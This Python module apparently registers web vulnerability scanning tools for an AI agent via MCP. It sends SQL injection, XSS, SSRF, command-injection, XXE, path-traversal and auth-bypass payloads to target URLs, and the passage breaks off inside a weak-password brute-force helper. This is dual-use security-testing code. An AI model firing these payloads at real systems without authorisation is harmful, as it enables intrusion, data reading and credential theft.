#!/usr/bin/env python3
"""
漏洞检测工具模块 - Web漏洞扫描相关功能
包含: SQL注入、XSS、CSRF、SSRF、命令注入、XXE、IDOR、文件上传、认证绕过等

注意: 此模块正在逐步迁移到 tools.detectors 模块化架构
新代码应优先使用 tools.detectors 中的检测器类
"""

import time
import re
import base64
import json
from urllib.parse import urlparse

from ._common import (
    GLOBAL_CONFIG, HAS_REQUESTS, get_verify_ssl, validate_target_host
)

# 可选依赖
if HAS_REQUESTS:
    import requests

# 导入新的模块化检测器 (用于渐进式迁移)
try:
    from .detectors import (
        SQLiDetector, XSSDetector, RCEDetector,
        SSRFDetector, CSRFDetector, CORSDetector,
        LFIDetector, FileUploadDetector,
        AuthBypassDetector, WeakPasswordDetector,
        get_detector, list_detectors
    )
    HAS_DETECTORS = True
except ImportError:
    HAS_DETECTORS = False


def register_vuln_tools(mcp):
    """注册所有漏洞检测工具到 MCP 服务器"""

    @mcp.tool()
    def vuln_check(url: str) -> dict:
        """漏洞检测 - 检测常见Web漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []

        # 1. 检测目录遍历
        try:
            test_url = url.rstrip('/') + "/../../../etc/passwd"
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
            if "root:" in resp.text:
                vulns.append({"type": "Path Traversal", "severity": "HIGH", "url": test_url})
        except Exception:
            pass

        # 2. 检测信息泄露
        info_paths = [".git/config", ".env", "phpinfo.php", "server-status", "actuator/env"]
        for path in info_paths:
            try:
                test_url = url.rstrip('/') + "/" + path
                resp = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                if resp.status_code == 200 and len(resp.content) > 100:
                    vulns.append({"type": "Information Disclosure", "severity": "MEDIUM", "url": test_url, "path": path})
            except Exception:
                pass

        # 3. 检测CORS配置
        try:
            resp = requests.get(url, headers={"Origin": "https://evil.com"}, timeout=5, verify=get_verify_ssl())
            if "access-control-allow-origin" in resp.headers:
                origin = resp.headers.get("access-control-allow-origin")
                if origin == "*" or origin == "https://evil.com":
                    vulns.append({"type": "CORS Misconfiguration", "severity": "MEDIUM", "detail": f"ACAO: {origin}"})
        except Exception:
            pass

        # 4. 检测安全头缺失
        try:
            resp = requests.get(url, timeout=5, verify=get_verify_ssl())
            missing_headers = []
            if "x-frame-options" not in resp.headers:
                missing_headers.append("X-Frame-Options")
            if "x-content-type-options" not in resp.headers:
                missing_headers.append("X-Content-Type-Options")
            if "x-xss-protection" not in resp.headers:
                missing_headers.append("X-XSS-Protection")
            if missing_headers:
                vulns.append({"type": "Missing Security Headers", "severity": "LOW", "headers": missing_headers})
        except Exception:
            pass

        # 5. 检测HTTP方法
        try:
            resp = requests.options(url, timeout=5, verify=get_verify_ssl())
            if "allow" in resp.headers:
                methods = resp.headers["allow"]
                dangerous = [m for m in ["PUT", "DELETE", "TRACE"] if m in methods.upper()]
                if dangerous:
                    vulns.append({"type": "Dangerous HTTP Methods", "severity": "MEDIUM", "methods": dangerous})
        except Exception:
            pass

        return {"success": True, "url": url, "vulnerabilities": vulns, "total": len(vulns)}

    @mcp.tool()
    def sqli_detect(url: str, param: str = None, deep_scan: bool = True) -> dict:
        """SQL注入检测 - 增强版，支持时间盲注、布尔盲注和更多数据库指纹"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        # 扩展payload列表
        error_payloads = [
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
            "1' AND '1'='1", "1 AND 1=1", "' UNION SELECT NULL--",
            "1'1", "1 AND 1=1--", "' OR ''='", "') OR ('1'='1",
            "1' ORDER BY 1--", "1' ORDER BY 100--",  # 用于探测列数
        ]
        # 扩展数据库错误特征 - 更全面的指纹库
        error_patterns = [
            # MySQL
            r"sql syntax.*mysql", r"warning.*mysql_", r"mysqlclient", r"mysqli",
            r"valid mysql result", r"mysql_fetch", r"mysql_num_rows",
            # PostgreSQL
            r"postgresql.*error", r"pg_query", r"pg_exec", r"pgsql",
            r"unterminated quoted string", r"invalid input syntax for",
            # Oracle
            r"ora-\d{5}", r"oracle.*driver", r"oracle.*error",
            r"quoted string not properly terminated", r"sql command not properly ended",
            # SQL Server
            r"microsoft.*sql.*server", r"sqlserver", r"odbc.*driver",
            r"unclosed quotation mark", r"incorrect syntax near",
            r"sql server.*error", r"mssql", r"sqlsrv",
            # SQLite
            r"sqlite.*error", r"sqlite3\.operationalerror", r"sqlite_",
            r"unrecognized token", r"unable to open database",
            # 通用
            r"syntax error", r"sql syntax", r"query failed",
            r"you have an error in your sql", r"supplied argument is not a valid",
            r"division by zero", r"invalid column name", r"unknown column",
            r"column.*not found", r"table.*doesn't exist", r"no such table",
        ]

        base_url = url
        test_params = [param] if param else ["id", "page", "cat", "search", "q", "query", "user", "name", "item", "product"]

        # 1. 获取基线响应 - 多次请求取平均
        baseline_lengths = []
        for _ in range(3):
            try:
                baseline_resp = requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                baseline_lengths.append(len(baseline_resp.text))
            except Exception:
                pass
        baseline_length = sum(baseline_lengths) / len(baseline_lengths) if baseline_lengths else 0

        for p in test_params:
            # 错误型注入检测
            for payload in error_payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={payload}"
                    else:
                        test_url = f"{base_url}?{p}={payload}"

                    resp = requests.get(test_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                    resp_lower = resp.text.lower()

                    for pattern in error_patterns:
                        if re.search(pattern, resp_lower, re.IGNORECASE):
                            vulns.append({
                                "type": "Error-based SQLi",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": pattern,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass

            if not deep_scan:
                continue

            # 2. 时间盲注检测 - 增强版：多轮基线测量 + 统计验证 + 网络抖动补偿
            time_payloads = [
                ("' AND SLEEP(5)--", 5),
                ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5),
                ("'; WAITFOR DELAY '0:0:5'--", 5),
                ("' AND pg_sleep(5)--", 5),
                ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", 5),  # Oracle
                ("' AND BENCHMARK(5000000,SHA1('test'))--", 5),   # MySQL alternative
            ]
            for payload, delay in time_payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={payload}"
                    else:
                        test_url = f"{base_url}?{p}={payload}"

                    # 多轮基线测量 - 取中位数减少网络抖动影响
                    baseline_times = []
                    for _ in range(3):
                        try:
                            base_start = time.time()
                            requests.get(base_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                            baseline_times.append(time.time() - base_start)
                        except Exception:
                            pass

                    if len(baseline_times) < 2:
                        continue  # 基线测量失败，跳过

                    # 使用中位数作为基线，更稳定
                    baseline_times.sort()
                    base_elapsed = baseline_times[len(baseline_times) // 2]
                    # 计算基线标准差用于抖动补偿
                    baseline_avg = sum(baseline_times) / len(baseline_times)
                    baseline_variance = sum((t - baseline_avg) ** 2 for t in baseline_times) / len(baseline_times)
                    baseline_std = baseline_variance ** 0.5

                    # 网络抖动补偿：允许的误差 = 2倍标准差，最小0.5秒
                    jitter_tolerance = max(baseline_std * 2, 0.5)

                    # 第一次测试
                    start = time.time()
                    requests.get(test_url, timeout=delay + 10, verify=get_verify_ssl())
                    first_elapsed = time.time() - start

                    # 严格判断：响应时间必须 >= 基线 + 延迟 - 抖动容差
                    # 且响应时间必须 >= 延迟的90%（更严格的阈值）
                    min_expected = base_elapsed + delay - jitter_tolerance
                    if first_elapsed >= min_expected and first_elapsed >= delay * 0.90:
                        # 三轮验证 - 提高置信度
                        verify_times = []
                        for _ in range(2):
                            try:
                                start_v = time.time()
                                requests.get(test_url, timeout=delay + 10, verify=get_verify_ssl())
                                verify_times.append(time.time() - start_v)
                            except Exception:
                                pass

                        # 至少2次验证都延迟才确认
                        if len(verify_times) >= 2:
                            valid_delays = sum(1 for t in verify_times if t >= delay * 0.85)
                            if valid_delays >= 2:
                                avg_delay = sum(verify_times) / len(verify_times)
                                confidence = min(100, int((avg_delay / delay) * 80))
                                vulns.append({
                                    "type": "Time-based Blind SQLi",
                                    "severity": "CRITICAL",
                                    "param": p,
                                    "payload": payload,
                                    "evidence": f"响应延迟 {first_elapsed:.2f}s, 验证: {[f'{t:.2f}s' for t in verify_times]} (预期 {delay}s)",
                                    "url": test_url,
                                    "verified": True,
                                    "confidence": confidence,
                                    "baseline": f"{base_elapsed:.2f}s (±{baseline_std:.2f}s)"
                                })
                                break
                except Exception:
                    pass

            # 3. 布尔盲注检测 - 增强版，增加更多验证条件
            bool_payloads = [
                ("' AND '1'='1", "' AND '1'='2"),
                ("' AND 1=1--", "' AND 1=2--"),
                ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
                ("') AND ('1'='1", "') AND ('1'='2"),
                ("1 AND 1=1", "1 AND 1=2"),
            ]
            for true_payload, false_payload in bool_payloads:
                try:
                    if "?" in base_url:
                        true_url = f"{base_url}&{p}={true_payload}"
                        false_url = f"{base_url}&{p}={false_payload}"
                    else:
                        true_url = f"{base_url}?{p}={true_payload}"
                        false_url = f"{base_url}?{p}={false_payload}"

                    true_resp = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                    false_resp = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())

                    len_diff = abs(len(true_resp.text) - len(false_resp.text))
                    true_len = len(true_resp.text)
                    false_len = len(false_resp.text)
                    
                    # 增强判断条件
                    # 1. 长度差异足够大
                    len_diff_significant = len_diff > max(baseline_length * 0.1, 50)
                    # 2. True响应应与原始基线相似
                    true_vs_baseline = abs(true_len - baseline_length)
                    true_matches_baseline = true_vs_baseline < baseline_length * 0.15 if baseline_length > 0 else True
                    # 3. 状态码差异
                    status_diff = true_resp.status_code != false_resp.status_code
                    
                    if (len_diff_significant and true_matches_baseline) or status_diff:
                        # 二次验证
                        verify_true = requests.get(true_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                        verify_false = requests.get(false_url, timeout=GLOBAL_CONFIG["request_timeout"], verify=get_verify_ssl())
                        verify_diff = abs(len(verify_true.text) - len(verify_false.text))
                        
                        # 两次结果一致才确认
                        if verify_diff > 30:
                            vulns.append({
                                "type": "Boolean-based Blind SQLi",
                                "severity": "HIGH",
                                "param": p,
                                "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                                "evidence": f"响应长度差异: {len_diff}/{verify_diff} bytes (已验证)",
                                "url": true_url,
                                "verified": True
                            })
                            break
                except Exception:
                    pass

        return {"success": True, "url": url, "sqli_vulns": vulns, "total": len(vulns), "deep_scan": deep_scan}

    @mcp.tool()
    def xss_detect(url: str, param: str = None) -> dict:
        """XSS检测 - 自动检测跨站脚本漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "<body onload=alert(1)>"
        ]

        base_url = url
        test_params = [param] if param else ["search", "q", "query", "keyword", "name", "input", "text", "msg"]

        for p in test_params:
            for payload in payloads:
                try:
                    if "?" in base_url:
                        test_url = f"{base_url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"

                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                    if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                        vulns.append({
                            "type": "Reflected XSS",
                            "severity": "HIGH",
                            "param": p,
                            "payload": payload,
                            "url": test_url
                        })
                        break
                except Exception:
                    pass

        return {"success": True, "url": url, "xss_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def csrf_detect(url: str) -> dict:
        """CSRF检测 - 检测跨站请求伪造漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            html = resp.text.lower()

            # 检查CSRF Token
            has_csrf_token = any(token in html for token in [
                "csrf", "_token", "authenticity_token", "csrfmiddlewaretoken",
                "__requestverificationtoken", "antiforgery"
            ])

            # 检查SameSite Cookie
            samesite_missing = []
            for cookie in resp.cookies:
                cookie_str = str(resp.headers.get('Set-Cookie', ''))
                if 'samesite' not in cookie_str.lower():
                    samesite_missing.append(cookie.name)

            # 检查表单
            forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL)
            forms_without_csrf = 0
            for form in forms:
                if not any(token in form for token in ["csrf", "_token", "authenticity"]):
                    forms_without_csrf += 1

            if not has_csrf_token and forms_without_csrf > 0:
                vulns.append({
                    "type": "Missing CSRF Token",
                    "severity": "HIGH",
                    "detail": f"发现 {forms_without_csrf} 个表单缺少CSRF Token"
                })

            if samesite_missing:
                vulns.append({
                    "type": "Missing SameSite Cookie",
                    "severity": "MEDIUM",
                    "cookies": samesite_missing
                })

            # 检查Referer验证
            resp2 = requests.get(url, headers={"Referer": "https://evil.com"}, timeout=10, verify=get_verify_ssl())
            if resp2.status_code == resp.status_code:
                vulns.append({
                    "type": "No Referer Validation",
                    "severity": "LOW",
                    "detail": "服务器未验证Referer头"
                })

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {"success": True, "url": url, "csrf_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def ssrf_detect(url: str, param: str = None) -> dict:
        """SSRF检测 - 检测服务端请求伪造漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/",
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:6379/_INFO"
        ]

        test_params = [param] if param else ["url", "uri", "path", "src", "source", "link", "redirect", "target", "dest", "fetch", "proxy"]

        for p in test_params:
            for payload in payloads:
                try:
                    if "?" in url:
                        test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{url}?{p}={requests.utils.quote(payload)}"

                    resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)

                    indicators = [
                        "root:", "localhost", "127.0.0.1", "internal",
                        "ami-id", "instance-id", "meta-data",
                        "redis_version", "connected_clients"
                    ]

                    for indicator in indicators:
                        if indicator in resp.text.lower():
                            vulns.append({
                                "type": "SSRF",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": indicator,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass

        return {"success": True, "url": url, "ssrf_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def cmd_inject_detect(url: str, param: str = None) -> dict:
        """命令注入检测 - 检测OS命令注入漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            "; id", "| id", "|| id", "&& id", "& id",
            "; whoami", "| whoami", "|| whoami",
            "`id`", "$(id)", "${id}",
            "; sleep 5", "| sleep 5", "& timeout 5",
            "| cat /etc/passwd", "; type C:\\Windows\\win.ini"
        ]

        indicators = [
            "uid=", "gid=", "groups=",
            "root:", "daemon:", "bin:",
            "extensions",
            "for 16-bit app support"
        ]

        test_params = [param] if param else ["cmd", "exec", "command", "ping", "query", "host", "ip", "file", "path", "dir"]

        for p in test_params:
            for payload in payloads:
                try:
                    if "?" in url:
                        test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                    else:
                        test_url = f"{url}?{p}={requests.utils.quote(payload)}"

                    resp = requests.get(test_url, timeout=15, verify=get_verify_ssl())

                    for indicator in indicators:
                        if indicator in resp.text:
                            vulns.append({
                                "type": "Command Injection",
                                "severity": "CRITICAL",
                                "param": p,
                                "payload": payload,
                                "evidence": indicator,
                                "url": test_url
                            })
                            break
                except Exception:
                    pass

        return {"success": True, "url": url, "cmd_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def xxe_detect(url: str) -> dict:
        """XXE检测 - 检测XML外部实体注入漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
        ]

        headers = {"Content-Type": "application/xml"}

        for payload in payloads:
            try:
                resp = requests.post(url, data=payload, headers=headers, timeout=10, verify=get_verify_ssl())

                indicators = ["root:", "daemon:", "extensions", "for 16-bit"]
                for indicator in indicators:
                    if indicator in resp.text:
                        vulns.append({
                            "type": "XXE",
                            "severity": "CRITICAL",
                            "payload": payload[:100] + "...",
                            "evidence": indicator
                        })
                        break

                if any(err in resp.text.lower() for err in ["xml", "parser", "entity", "dtd"]):
                    vulns.append({
                        "type": "XXE Error Disclosure",
                        "severity": "MEDIUM",
                        "detail": "XML解析错误信息泄露"
                    })
            except Exception:
                pass

        return {"success": True, "url": url, "xxe_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def idor_detect(url: str, param: str = "id") -> dict:
        """IDOR检测 - 检测不安全的直接对象引用漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []
        findings = []

        test_ids = ["1", "2", "100", "1000", "0", "-1", "999999"]

        for test_id in test_ids:
            try:
                if "?" in url:
                    test_url = f"{url}&{param}={test_id}"
                else:
                    test_url = f"{url}?{param}={test_id}"

                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                if resp.status_code == 200 and len(resp.content) > 100:
                    findings.append({
                        "id": test_id,
                        "status": resp.status_code,
                        "size": len(resp.content)
                    })
            except Exception:
                pass

        if len(findings) > 1:
            sizes = [f["size"] for f in findings]
            if len(set(sizes)) > 1:
                vulns.append({
                    "type": "Potential IDOR",
                    "severity": "HIGH",
                    "param": param,
                    "detail": f"参数 {param} 可能存在IDOR漏洞，不同ID返回不同内容",
                    "findings": findings
                })

        return {"success": True, "url": url, "idor_vulns": vulns, "total": len(vulns)}

    @mcp.tool()
    def file_upload_detect(url: str) -> dict:
        """文件上传漏洞检测 - 检测不安全的文件上传"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        vulns = []

        test_files = [
            ("test.php", "<?php echo 'test'; ?>", "application/x-php"),
            ("test.php.jpg", "<?php echo 'test'; ?>", "image/jpeg"),
            ("test.phtml", "<?php echo 'test'; ?>", "text/html"),
            ("test.php%00.jpg", "<?php echo 'test'; ?>", "image/jpeg"),
            ("test.jsp", "<% out.println(\"test\"); %>", "application/x-jsp"),
            ("test.asp", "<% Response.Write(\"test\") %>", "application/x-asp"),
            ("test.svg", "<svg onload=alert(1)>", "image/svg+xml"),
            ("test.html", "<script>alert(1)</script>", "text/html"),
        ]

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            html = resp.text.lower()

            has_upload = 'type="file"' in html or "multipart/form-data" in html

            if has_upload:
                vulns.append({
                    "type": "File Upload Form Found",
                    "severity": "INFO",
                    "detail": "发现文件上传功能，需要手动测试"
                })

                if "accept=" in html:
                    vulns.append({
                        "type": "Client-side Validation Only",
                        "severity": "MEDIUM",
                        "detail": "仅有客户端文件类型验证，可能被绕过"
                    })

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "upload_vulns": vulns,
            "total": len(vulns),
            "test_payloads": [f[0] for f in test_files],
            "note": "文件上传漏洞需要手动测试，以上为建议测试的文件类型"
        }

    @mcp.tool()
    def auth_bypass_detect(url: str) -> dict:
        """认证绕过检测 - 检测常见认证绕过漏洞 (带SPA误报过滤)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        # 导入响应过滤器
        try:
            from core.response_filter import get_response_filter
            resp_filter = get_response_filter()
            resp_filter.calibrate(url)
        except ImportError:
            resp_filter = None

        vulns = []
        filtered_count = 0

        bypass_paths = [
            "/admin", "/admin/", "/admin//", "/admin/./",
            "/Admin", "/ADMIN", "/administrator",
            "/admin%20", "/admin%00", "/admin..;/",
            "/admin;", "/admin.json", "/admin.html",
            "//admin", "///admin", "/./admin",
            "/admin?", "/admin#", "/admin%2f"
        ]

        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "localhost"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
        ]

        base_url = url.rstrip('/')

        # 获取基线响应
        baseline_html = ""
        baseline_status = 0
        try:
            baseline_resp = requests.get(base_url + "/admin", timeout=5, verify=get_verify_ssl(), allow_redirects=False)
            baseline_html = baseline_resp.text
            baseline_status = baseline_resp.status_code
        except Exception:
            pass

        # 路径绕过测试
        for path in bypass_paths:
            try:
                test_url = base_url + path
                resp = requests.get(test_url, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                if resp.status_code == 200:
                    if resp_filter:
                        validation = resp_filter.validate_auth_bypass(
                            test_url, resp.text, baseline_html, resp.status_code
                        )
                        if not validation["valid"]:
                            filtered_count += 1
                            continue
                        confidence = validation["confidence"]
                        reason = validation["reason"]
                    else:
                        confidence = 0.5
                        reason = "Basic check passed"

                    vulns.append({
                        "type": "Path Bypass",
                        "severity": "HIGH" if confidence > 0.7 else "MEDIUM",
                        "path": path,
                        "status": resp.status_code,
                        "confidence": confidence,
                        "evidence": reason
                    })
            except Exception:
                pass

        # 头部绕过测试
        for headers in bypass_headers:
            try:
                resp = requests.get(base_url + "/admin", headers=headers, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                if resp.status_code == 200:
                    if resp_filter:
                        validation = resp_filter.validate_auth_bypass(
                            base_url + "/admin", resp.text, baseline_html, resp.status_code
                        )
                        if not validation["valid"]:
                            filtered_count += 1
                            continue
                        confidence = validation["confidence"]
                        reason = validation["reason"]
                    else:
                        confidence = 0.5
                        reason = "Basic check passed"

                    vulns.append({
                        "type": "Header Bypass",
                        "severity": "HIGH" if confidence > 0.7 else "MEDIUM",
                        "headers": headers,
                        "status": resp.status_code,
                        "confidence": confidence,
                        "evidence": reason
                    })
            except Exception:
                pass

        vulns.sort(key=lambda x: x.get("confidence", 0), reverse=True)

        return {
            "success": True,
            "url": url,
            "auth_bypass_vulns": vulns,
            "total": len(vulns),
            "filtered_spa_fallback": filtered_count,
            "baseline_status": baseline_status
        }

    @mcp.tool()
    def logic_vuln_check(url: str) -> dict:
        """逻辑漏洞检测 - 检测常见业务逻辑漏洞"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []
        recommendations = []

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            html = resp.text.lower()

            # 1. 检测价格/数量参数
            price_params = ["price", "amount", "quantity", "qty", "total", "discount", "coupon"]
            for param in price_params:
                if param in html:
                    findings.append({
                        "type": "Price/Quantity Parameter",
                        "severity": "MEDIUM",
                        "detail": f"发现 {param} 参数，可能存在价格篡改漏洞"
                    })
                    recommendations.append(f"测试 {param} 参数是否可被篡改为负数或极小值")

            # 2. 检测验证码
            if "captcha" in html or "验证码" in html:
                findings.append({
                    "type": "Captcha Found",
                    "severity": "INFO",
                    "detail": "发现验证码，测试是否可绕过"
                })
                recommendations.append("测试验证码是否可重复使用、是否可删除参数绕过")

            # 3. 检测短信/邮件验证
            if any(x in html for x in ["sms", "短信", "验证码", "email", "邮箱"]):
                findings.append({
                    "type": "SMS/Email Verification",
                    "severity": "INFO",
                    "detail": "发现短信/邮箱验证功能"
                })
                recommendations.append("测试验证码是否可爆破、是否有频率限制")

            # 4. 检测支付相关
            if any(x in html for x in ["pay", "payment", "支付", "checkout", "order"]):
                findings.append({
                    "type": "Payment Function",
                    "severity": "HIGH",
                    "detail": "发现支付功能，需重点测试"
                })
                recommendations.extend([
                    "测试订单金额是否可篡改",
                    "测试是否可修改支付状态",
                    "测试是否存在并发支付漏洞"
                ])

            # 5. 检测用户相关
            if any(x in html for x in ["user", "profile", "account", "用户", "个人"]):
                findings.append({
                    "type": "User Function",
                    "severity": "MEDIUM",
                    "detail": "发现用户功能"
                })
                recommendations.extend([
                    "测试是否可越权访问其他用户信息",
                    "测试密码重置流程是否安全",
                    "测试是否可批量注册"
                ])

            # 6. 检测API接口
            if any(x in html for x in ["api", "/v1/", "/v2/", "graphql"]):
                findings.append({
                    "type": "API Endpoint",
                    "severity": "MEDIUM",
                    "detail": "发现API接口"
                })
                recommendations.extend([
                    "测试API是否有认证",
                    "测试是否存在未授权访问",
                    "测试是否有速率限制"
                ])

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "findings": findings,
            "recommendations": recommendations,
            "note": "逻辑漏洞需要结合业务场景手动测试，以上为自动化检测建议"
        }

    @mcp.tool()
    def deserialize_detect(url: str, param: str = None) -> dict:
        """反序列化漏洞检测 - 检测Java/PHP/Python反序列化漏洞 (A08)"""
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        findings = []

        java_payloads = [
            ("aced0005", "Java序列化魔数"),
            ("rO0AB", "Java Base64序列化"),
            ("H4sIAAAA", "Java Gzip序列化"),
        ]

        php_payloads = [
            ('O:8:"stdClass"', "PHP对象序列化"),
            ("a:1:{", "PHP数组序列化"),
            ("s:4:", "PHP字符串序列化"),
        ]

        python_payloads = [
            ("gASV", "Python Pickle Base64"),
            ("(dp0", "Python Pickle"),
            ("cos\nsystem", "Python Pickle RCE"),
        ]

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            content = resp.text
            cookies = resp.cookies.get_dict()

            for payload, desc in java_payloads + php_payloads + python_payloads:
                if payload in content:
                    findings.append({
                        "type": "Response Content",
                        "pattern": payload,
                        "description": desc,
                        "severity": "HIGH"
                    })

            for name, value in cookies.items():
                for payload, desc in java_payloads + php_payloads + python_payloads:
                    if payload in value:
                        findings.append({
                            "type": "Cookie",
                            "cookie_name": name,
                            "pattern": payload,
                            "description": desc,
                            "severity": "CRITICAL"
                        })

            deser_endpoints = [
                "/invoker/readonly", "/invoker/JMXInvokerServlet",
                "/_async/AsyncResponseService", "/wls-wsat/",
                "/solr/admin/cores", "/actuator",
            ]

            base_url = url.rstrip('/')
            for endpoint in deser_endpoints:
                try:
                    r = requests.get(f"{base_url}{endpoint}", timeout=5, verify=get_verify_ssl())
                    if r.status_code != 404:
                        findings.append({
                            "type": "Dangerous Endpoint",
                            "endpoint": endpoint,
                            "status_code": r.status_code,
                            "severity": "HIGH"
                        })
                except Exception:
                    pass

            if param:
                test_payloads = [
                    ('O:8:"stdClass":0:{}', "PHP"),
                    ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "Java"),
                ]
                for payload, lang in test_payloads:
                    try:
                        test_url = f"{url}?{param}={payload}"
                        r = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                        if r.status_code == 500 or "exception" in r.text.lower():
                            findings.append({
                                "type": "Parameter Injection",
                                "param": param,
                                "language": lang,
                                "severity": "CRITICAL",
                                "detail": "参数可能存在反序列化漏洞"
                            })
                    except Exception:
                        pass

        except Exception as e:
            return {"success": False, "error": str(e)}

        return {
            "success": True,
            "url": url,
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "recommendations": [
                "避免反序列化不可信数据",
                "使用白名单验证反序列化类",
                "升级到安全版本的序列化库",
                "使用JSON等安全的数据格式替代"
            ] if findings else []
        }

    def _cms_weak_password_detect(url: str, cms: str, cms_config: dict, username: str = None) -> dict:
        """CMS专用弱口令检测辅助函数"""
        findings = []
        base_url = url.rstrip('/')

        endpoints = cms_config.get("endpoints", [])
        credentials = cms_config.get("credentials", [])
        auth_type = cms_config.get("auth_type", "form")
        check_only = cms_config.get("check_only", False)
        user_field = cms_config.get("user_field", "username")
        pass_field = cms_config.get("pass_field", "password")
        success_indicators = cms_config.get("success_indicators", ["logout", "dashboard", "welcome"])

        exposed_panels = []

        for endpoint in endpoints:
            test_url = f"{base_url}{endpoint}"

            # 只检查是否暴露 (如 Nginx status)
            if check_only:
                try:
                    r = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                    if r.status_code == 200:
                        for indicator in success_indicators:
                            if indicator in r.text.lower():
                                exposed_panels.append({
                                    "cms": cms,
                                    "url": test_url,
                                    "type": "Information Exposure"
                                })
                                break
                except Exception:
                    pass
                continue

            # Basic Auth
            if auth_type == "basic":
                for user, pwd in credentials:
                    if username:
                        user = username
                    try:
                        r = requests.get(
                            test_url,
                            auth=(user, pwd),
                            timeout=5,
                            verify=get_verify_ssl()
                        )
                        if r.status_code == 200:
                            for indicator in success_indicators:
                                if indicator in r.text.lower():
                                    findings.append({
                                        "type": "Weak Credential",
                                        "cms": cms,
                                        "endpoint": endpoint,
                                        "username": user,
                                        "password": pwd,
                                        "auth_type": "basic",
                                        "severity": "CRITICAL"
                                    })
                                    break
                    except Exception:
                        pass
            else:
                # Form-based Auth
                for user, pwd in credentials:
                    if username:
                        user = username
                    try:
                        data = {user_field: user, pass_field: pwd}
                        r = requests.post(
                            test_url,
